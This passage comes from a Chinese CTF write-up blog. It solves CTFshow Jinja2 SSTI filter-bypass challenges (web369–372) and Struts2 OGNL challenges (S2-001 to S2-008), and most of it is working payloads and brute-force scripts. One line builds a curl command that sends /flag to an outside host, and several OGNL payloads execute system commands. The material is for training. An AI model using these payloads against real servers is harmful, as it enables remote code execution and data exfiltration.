class="string">&#x27;d&#x27;</span>: <span class="string">f&#x27;<span class="subst">&#123;flag_pre + j&#125;</span>&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.get(url, params=params)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;H3llo&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag_pre += j</span><br><span class="line">            <span class="built_in">print</span>(flag_pre)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690107790825-13d6d576-602b-4867-8fec-3dbd5b48c04e.png" alt="image.png"></p><h1 id="web369"><a href="#web369" class="headerlink" title="web369"></a>web369</h1><h3 id="过滤request"><a href="#过滤request" class="headerlink" title="过滤request"></a>过滤request</h3><p>直接开拼<br>下划线被 ban，<strong>str</strong>()不能用，需要用 string 过滤器得到 config 字符串：config|string，但是获得字符串后本来应该用中括号或者__getitem__()，但是问题是_被ban了，所以获取字符串中的某个字符比较困难，这里转换成列表，再用列表的pop方法就可以成功得到某个字符了，在跑字符的时候发现没有小写的b，只有大写的B，所以再去一层.lower()方法，方便跑更多字符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://eee5217c-c792-4517-883f-d6b38c2f5a58.challenge.ctf.show/?name=&#123; &#123; % print (config|string|list).pop(&#123;&#125;).lower() % &#125; &#125;&#x27;</span></span><br><span class="line">flag_pre = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;_&#x27;</span> + string.printable</span><br><span class="line">payload = <span class="string">&#x27;tac /flag&#x27;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> payload:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">1000</span>):</span><br><span class="line">        r=requests.get(url=url.<span class="built_in">format</span>(i))</span><br><span class="line">        location=r.text.find(<span class="string">&quot;&lt;h3&gt;&quot;</span>)</span><br><span class="line">        word=r.text[location+<span class="number">4</span>:location+<span class="number">5</span>]</span><br><span class="line">        <span class="keyword">if</span> word==j.lower():</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;(config|string|list).pop(%d).lower() == %s&quot;</span>%(i,j))</span><br><span class="line">            res+=<span class="string">&quot;(config|string|list).pop(%d).lower()~&quot;</span>%(i)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123; % <span class="built_in">print</span> (lipsum|attr((config|string|<span class="built_in">list</span>).pop(<span class="number">74</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">74</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">6</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">41</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">2</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">33</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">40</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">41</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">42</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">74</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">74</span>).lower()</span><br><span class="line">)).get((config|string|<span class="built_in">list</span>).pop(<span class="number">2</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">42</span>).lower()).popen((config|string|<span class="built_in">list</span>).pop(<span class="number">1</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">40</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">23</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">7</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">279</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">4</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">41</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">40</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">6</span>).lower()).read() % &#125;</span><br></pre></td></tr></table></figure><h2 id="替换字符"><a href="#替换字符" class="headerlink" title="替换字符"></a>替换字符</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">?name=</span><br><span class="line">&#123; % <span class="built_in">set</span> a=(()|select|string|<span class="built_in">list</span>).pop(<span class="number">24</span>) % &#125;</span><br><span class="line">&#123;</span><br><span class="line">   % <span class="built_in">set</span> <span class="built_in">globals</span>=(a,a,<span class="built_in">dict</span>(<span class="built_in">globals</span>=<span class="number">1</span>)|join,a,a)|join % &#125;</span><br><span class="line">&#123;</span><br><span class="line">   % <span class="built_in">set</span> init=(a,a,<span class="built_in">dict</span>(init=<span class="number">1</span>)|join,a,a)|join % &#125;</span><br><span class="line">&#123;</span><br><span class="line">   % <span class="built_in">set</span> builtins=(a,a,<span class="built_in">dict</span>(builtins=<span class="number">1</span>)|join,a,a)|join % &#125;</span><br><span class="line">&#123;</span><br><span class="line">   % <span class="built_in">set</span> a=(lipsum|attr(<span class="built_in">globals</span>)).get(builtins) % &#125;</span><br><span class="line">&#123;</span><br><span class="line">   % <span class="built_in">set</span> <span class="built_in">chr</span>=a.<span class="built_in">chr</span> % &#125;</span><br><span class="line">&#123;</span><br><span class="line">   % <span class="built_in">print</span> a.<span class="built_in">open</span>(<span class="built_in">chr</span>(<span class="number">47</span>)~<span class="built_in">chr</span>(<span class="number">102</span>)~<span class="built_in">chr</span>(<span class="number">108</span>)~<span class="built_in">chr</span>(<span class="number">97</span>)~<span class="built_in">chr</span>(<span class="number">103</span>)).read() % &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>相当于：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">lipsum.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在__builtins__里面拿到chr，同样可以很方便的构造字符</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web370"><a href="#web370" class="headerlink" title="web370"></a>web370</h1><h3 id="过滤数字"><a href="#过滤数字" class="headerlink" title="过滤数字"></a>过滤数字</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123; %<span class="built_in">set</span> num=<span class="built_in">dict</span>(aaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> numm=<span class="built_in">dict</span>(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> x=(()|select|string|<span class="built_in">list</span>).pop(num)% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> glob = (x,x,<span class="built_in">dict</span>(<span class="built_in">globals</span>=a)|join,x,x)|join % &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> builtins=x~x~(<span class="built_in">dict</span>(builtins=a)|join)~x~x% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> c = <span class="built_in">dict</span>(<span class="built_in">chr</span>=a)|join% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> o = <span class="built_in">dict</span>(o=a,s=a)|join% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> getitem = x~x~(<span class="built_in">dict</span>(getitem=a)|join)~x~x% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> <span class="built_in">chr</span> = lipsum|attr(glob)|attr(getitem)(builtins)|attr(getitem)(c)% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> file = <span class="built_in">chr</span>(numm)~<span class="built_in">dict</span>(flag=a)|join% &#125;</span><br><span class="line">&#123; %<span class="built_in">print</span>((lipsum|attr(glob)|attr(getitem)(builtins)).<span class="built_in">open</span>(file).read())% &#125;</span><br></pre></td></tr></table></figure><h1 id="web371"><a href="#web371" class="headerlink" title="web371"></a>web371</h1><h3 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&#123; %<span class="built_in">set</span> e=<span class="built_in">dict</span>(a=a)|join|count% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> ee=<span class="built_in">dict</span>(aa=a)|join|count% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> eee=<span class="built_in">dict</span>(aaa=a)|join|count% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> eeee=<span class="built_in">dict</span>(aaaa=a)|join|count% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> eeeee=<span class="built_in">dict</span>(aaaaa=a)|join|count% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> eeeeee=<span class="built_in">dict</span>(aaaaaa=a)|join|count% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> eeeeeee=<span class="built_in">dict</span>(aaaaaaa=a)|join|count% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> eeeeeeee=<span class="built_in">dict</span>(aaaaaaaa=a)|join|count% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> eeeeeeeee=<span class="built_in">dict</span>(aaaaaaaaa=a)|join|count% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> eeeeeeeeee=<span class="built_in">dict</span>(aaaaaaaaaa=a)|join|count% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> x=(()|select|string|<span class="built_in">list</span>).pop((ee~eeee)|<span class="built_in">int</span>)% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> glob = (x,x,<span class="built_in">dict</span>(<span class="built_in">globals</span>=a)|join,x,x)|join % &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> builtins=x~x~(<span class="built_in">dict</span>(builtins=a)|join)~x~x% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> <span class="keyword">import</span>=x~x~(<span class="built_in">dict</span>(<span class="keyword">import</span>=a)|join)~x~x% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> c = <span class="built_in">dict</span>(<span class="built_in">chr</span>=a)|join% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> o = <span class="built_in">dict</span>(o=a,s=a)|join% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> getitem = x~x~(<span class="built_in">dict</span>(getitem=a)|join)~x~x% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> <span class="built_in">chr</span> = lipsum|attr(glob)|attr(getitem)(builtins)|attr(getitem)(c)% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> zero=<span class="built_in">chr</span>((eeee~eeeeeeee)|<span class="built_in">int</span>)% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> cmd = </span><br><span class="line">% &#125;</span><br><span class="line">&#123; %<span class="keyword">if</span> (lipsum|attr(glob)|attr(getitem)(builtins)).<span class="built_in">eval</span>(cmd)% &#125;</span><br><span class="line">eastjun</span><br><span class="line">&#123; %endif% &#125;</span><br></pre></td></tr></table></figure><p>命令生成脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">filting</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join([<span class="string">f&quot;chr(<span class="subst">&#123;<span class="built_in">ord</span>(i)&#125;</span>)~&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> s])[:-<span class="number">1</span>]</span><br><span class="line">cmd=filting(<span class="string">&quot;curl https://eastjun.top?flag=`cat /flag`&quot;</span>)</span><br><span class="line">nums = <span class="built_in">set</span>(re.findall(<span class="string">&quot;(\d+)&quot;</span>,cmd))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> nums:</span><br><span class="line">    patnum = <span class="string">&quot;&quot;</span>.join([<span class="string">&quot;zero~&quot;</span> <span class="keyword">if</span> j==<span class="string">&quot;0&quot;</span> <span class="keyword">else</span> <span class="string">f&#x27;<span class="subst">&#123;<span class="string">&quot;e&quot;</span> * <span class="built_in">int</span>(j)&#125;</span>~&#x27;</span> <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">f&quot;<span class="subst">&#123;i&#125;</span>&quot;</span>])</span><br><span class="line">    cmd = cmd.replace(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>&quot;</span>,<span class="string">f&quot;(<span class="subst">&#123;patnum[:-<span class="number">1</span>]&#125;</span>)|int&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(cmd)</span><br></pre></td></tr></table></figure><h1 id="web372"><a href="#web372" class="headerlink" title="web372"></a>web372</h1><h3 id="无回显过滤"><a href="#无回显过滤" class="headerlink" title="无回显过滤"></a>无回显过滤</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&#123; %<span class="built_in">set</span> e=<span class="built_in">dict</span>(a=a)|join|length% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> ee=<span class="built_in">dict</span>(aa=a)|join|length% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> eee=<span class="built_in">dict</span>(aaa=a)|join|length% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> eeee=<span class="built_in">dict</span>(aaaa=a)|join|length% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> eeeee=<span class="built_in">dict</span>(aaaaa=a)|join|length% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> eeeeee=<span class="built_in">dict</span>(aaaaaa=a)|join|length% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> eeeeeee=<span class="built_in">dict</span>(aaaaaaa=a)|join|length% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> eeeeeeee=<span class="built_in">dict</span>(aaaaaaaa=a)|join|length% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> eeeeeeeee=<span class="built_in">dict</span>(aaaaaaaaa=a)|join|length% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> eeeeeeeeee=<span class="built_in">dict</span>(aaaaaaaaaa=a)|join|length% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> x=(()|select|string|<span class="built_in">list</span>).pop((ee~eeee)|<span class="built_in">int</span>)% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> glob = (x,x,<span class="built_in">dict</span>(<span class="built_in">globals</span>=a)|join,x,x)|join % &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> builtins=x~x~(<span class="built_in">dict</span>(builtins=a)|join)~x~x% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> <span class="keyword">import</span>=x~x~(<span class="built_in">dict</span>(<span class="keyword">import</span>=a)|join)~x~x% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> c = <span class="built_in">dict</span>(<span class="built_in">chr</span>=a)|join% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> o = <span class="built_in">dict</span>(o=a,s=a)|join% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> getitem = x~x~(<span class="built_in">dict</span>(getitem=a)|join)~x~x% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> <span class="built_in">chr</span> = lipsum|attr(glob)|attr(getitem)(builtins)|attr(getitem)(c)% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> zero=<span class="built_in">chr</span>((eeee~eeeeeeee)|<span class="built_in">int</span>)% &#125;</span><br><span class="line">&#123; %<span class="built_in">set</span> cmd = </span><br><span class="line">% &#125;</span><br><span class="line">&#123; %<span class="keyword">if</span> (lipsum|attr(glob)|attr(getitem)(builtins)).<span class="built_in">eval</span>(cmd)% &#125;</span><br><span class="line">eastjun</span><br><span class="line">&#123; %endif% &#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CTFshow0-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web279-web300JavaStrut2篇</title>
      <link href="/2023/09/17/web279-web300JavaStrut2%E7%AF%87/"/>
      <url>/2023/09/17/web279-web300JavaStrut2%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<blockquote><p><a href="https://blog.csdn.net/q20010619/article/details/120729447">https://blog.csdn.net/q20010619/article/details/120729447</a></p></blockquote><p>这里面的漏洞都是struts2漏洞，使用<br>建议下载Struts2scan工具辅助学习。</p><blockquote><p><a href="https://github.com/HatBoy/Struts2-Scan.git">https://github.com/HatBoy/Struts2-Scan.git</a><br><a href="https://github.com/shack2/Struts2VulsTools">https://github.com/shack2/Struts2VulsTools</a></p></blockquote><ul><li>通过页面回显的错误消息来判断，页面不回显错误消息时则无效</li><li>通过网页后缀来判断，如.do .action，有可能不准<ul><li>如果配置文件中常数extension的值以逗号结尾或者有空值，指明了action可以不带后缀，那么不带后缀的uri也可能是struts2框架搭建的</li><li>如果使用Struts2的rest插件，其默认的struts-plugin.xml指定的请求后缀为xhtml,xml和json</li></ul></li><li>判断 /struts/webconsole.html 是否存在来进行判断，需要 devMode 为 true<h1 id="web279"><a href="#web279" class="headerlink" title="web279"></a>web279</h1><blockquote><p><a href="https://www.freebuf.com/column/224041.html">https://www.freebuf.com/column/224041.html</a></p></blockquote></li></ul><h3 id="S2-001"><a href="#S2-001" class="headerlink" title="S2-001"></a>S2-001</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">printenv | grep FLAG</span><br></pre></td></tr></table></figure><p>struts2漏洞 S2-001是当用户提交表单数据且验证失败时，服务器使用OGNL表达式解析用户先前提交的参数值，%{value}并重新填充相应的表单数据<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690893342133-0c453427-6529-45f6-a84e-7a9b30b1cddc.png" alt="image.png">在struts2中，DefaultActionMapper类支持以”action:”、“redirect:”、”redirectAction:”作为导航或是重定向前缀，但是这些前缀后面同时可以跟OGNL表达式，由于struts2没有对这些前缀做过滤，导致利用OGNL表达式调用java静态方法执行任意系统命令</p><p>所以，访问<a href="http://your-ip:8080/index.action?redirect:OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%8D%B3%E5%8F%AF%E6%89%A7%E8%A1%8COGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F">http://your-ip:8080/index.action?redirect:OGNL表达式即可执行OGNL表达式</a></p><p>影响版本: 2.0.0 - 2.3.15<br>我们输入测试命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">%</span><span class="language-bash">&#123;1+1&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690894169760-b882601b-4fc3-4cdf-a91d-3e7e81a3bb7f.png" alt="image.png"><br>提交之后发现加法表达式被成功执行了。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690894216166-7493cfb3-b16a-4c94-aedf-76293e9ca03d.png" alt="image.png"></p><ul><li>%的用途是在标志的属性为字符串类型时，计算OGNL表达式%{}中的值</li><li>#的用途访主要是访问非根对象属性，因为Struts 2中值栈被视为根对象，所以访问其他非根对象时，需要加#前缀才可以调用</li><li>$主要是在Struts 2配置文件中，引用OGNL表达式</li></ul><p>常用payload：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 获取tomcat路径</span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash">&#123;<span class="string">&quot;tomcatBinDir&#123;&quot;</span>+@java.lang.System@getProperty(<span class="string">&quot;user.dir&quot;</span>)+<span class="string">&quot;&#125;&quot;</span>&#125;</span></span><br><span class="line"></span><br><span class="line">// 获取web路径</span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash">&#123;<span class="comment">#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#response.println(#req.getRealPath(&#x27;/&#x27;)),#response.flush(),#response.close()&#125;</span></span></span><br><span class="line"></span><br><span class="line">// 命令执行 env，flag就在其中</span><br><span class="line">password=%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;env&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;&amp;username=1</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690894841073-47f7327b-4cdc-46d9-9821-109faa25e90e.png" alt="image.png"><br>url转义一下。<br>这个用struts2scan工具扫描，但是无法检测出漏洞，这里不清楚为什么。<br>ctfshow这个靶场的用不了，但是vulhub自己搭就可以。但是两个都无法进行漏洞利用（进入命令行模式）<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690898715564-49bc97ef-53b3-4a51-a792-d439165e1f2f.png" alt="image.png"><br>这里换了一个工具，但是也是不能用001，但是可以执行016了。</p><blockquote><p><a href="https://github.com/shack2/Struts2VulsTools">https://github.com/shack2/Struts2VulsTools</a></p></blockquote><h1 id="web280"><a href="#web280" class="headerlink" title="web280"></a>web280</h1><h3 id="S2-005"><a href="#S2-005" class="headerlink" title="S2-005"></a>S2-005</h3><p>Struts2将HTTP的每个参数名解析为ognl语句执行,而ognl表达式是通过#来访问struts的对象，Struts2框架虽然过滤了#来进行过滤，但是可以通过unicode编码（u0023）或8进制（43）绕过了安全限制，达到代码执行的效果<br>影响版本：Struts 2.0.0 - Struts 2.0.11.2<br>poc：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?(&#x27;\u0023context[\&#x27;xwork.MethodAccessor.denyMethodExecution\&#x27;]\u003dfalse&#x27;)(bla)(bla)&amp;(&#x27;\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET&#x27;)(kxlzx)(kxlzx)&amp;(&#x27;\u0023mycmd\u003d\&#x27;ifconfig\&#x27;&#x27;)(bla)(bla)&amp;(&#x27;\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)&#x27;)(bla)(bla)&amp;(A)((&#x27;\u0023mydat\u003dnew\40java.io.DataInputStream(\u0023myret.getInputStream())&#x27;)(bla))&amp;(B)((&#x27;\u0023myres\u003dnew\40byte[51020]&#x27;)(bla))&amp;(C)((&#x27;\u0023mydat.readFully(\u0023myres)&#x27;)(bla))&amp;(D)((&#x27;\u0023mystr\u003dnew\40java.lang.String(\u0023myres)&#x27;)(bla))&amp;(&#x27;\u0023myout\u003d@org.apache.struts2.ServletActionContext@getResponse()&#x27;)(bla)(bla)&amp;(E)((&#x27;\u0023myout.getWriter().println(\u0023mystr)&#x27;)(bla))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>他给的这个poc也不太能用<br>这里直接用工具了：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690900144282-73dea694-41b3-47e5-aff2-63823b79a439.png" alt="image.png"><br>那个struts2scan是真不好用啊。各种误判。</p><h1 id="web281"><a href="#web281" class="headerlink" title="web281"></a>web281</h1><h3 id="S2-007"><a href="#S2-007" class="headerlink" title="S2-007"></a>S2-007</h3><p>当配置了验证规则 <ActionName>-validation.xml 时，若类型验证转换出错，后端默认会将用户提交的表单值通过字符串拼接，然后执行一次 OGNL 表达式解析并返回<br>影响版本：Struts2 2.0.0 - Struts2 2.2.3<br>poc：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#foo=new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;printenv | grep FLAG&#x27;).getInputStream())) + &#x27;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690900949819-59a428bb-9741-40bb-85c4-9e8396a2b2e5.png" alt="image.png"></p><h1 id="web282"><a href="#web282" class="headerlink" title="web282"></a>web282</h1><h3 id="S2-008"><a href="#S2-008" class="headerlink" title="S2-008"></a>S2-008</h3><p>S2-008 涉及多个漏洞，Cookie 拦截器错误配置可造成 OGNL 表达式执行，但是由于大多 Web 容器（如 Tomcat）对 Cookie 名称都有字符限制，一些关键字符无法使用使得这个点显得比较鸡肋。另一个比较鸡肋的点就是在 struts2 应用开启 devMode 模式后会有多个调试接口能够直接查看对象信息或直接执行命令，正如 kxlzx 所提这种情况在生产环境中几乎不可能存在，因此就变得很鸡肋的，但我认为也不是绝对的，万一被黑了专门丢了一个开启了 debug 模式的应用到服务器上作为后门也是有可能的<br>影响版本：Struts 2.1.0 - Struts 2.3.1</p><h2 id="姿势1"><a href="#姿势1" class="headerlink" title="姿势1"></a>姿势1</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie:(&#x27;#_memberAccess.setAllowStaticMethodAccess(true)&#x27;)(1)(2)=Aluvion; (&#x27;@java.lang.Runtime@getRuntime().exec(&quot;calc&quot;)&#x27;)(1)(2)=Twings;</span><br></pre></td></tr></table></figure><p>没成功</p><h2 id="姿势2"><a href="#姿势2" class="headerlink" title="姿势2"></a>姿势2</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">devmode.action?debug=command&amp;expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27printenv%20%7C%20grep%20FLAG%27%29.getInputStream%28%29%29)</span><br></pre></td></tr></table></figure><p>这个可以<br>当然也可以用S2-016直接梭</p><h1 id="web283"><a href="#web283" class="headerlink" title="web283"></a>web283</h1><h3 id="S2-009"><a href="#S2-009" class="headerlink" 